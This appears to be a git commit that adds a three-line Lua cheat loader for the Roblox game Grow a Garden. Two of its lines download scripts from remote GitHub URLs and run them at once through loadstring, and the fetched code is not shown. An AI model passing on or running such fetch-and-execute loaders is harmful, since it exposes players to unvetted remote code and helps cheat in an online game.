34c7ef2928ced2e6eb305c20f9131ae121e85db8
Roblox Scripts <gregyheport@gmail.com>
2025-08-19 09:27:35 +0800

    Create MiddleCatV5-NewMethod-SpeedXHub-GrowAGarden-Working.lua

---
+++ MiddleCatV5-NewMethod-SpeedXHub-GrowAGarden-Working.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+task.wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Rawbr10/loader/refs/heads/main/loader.lua"))()
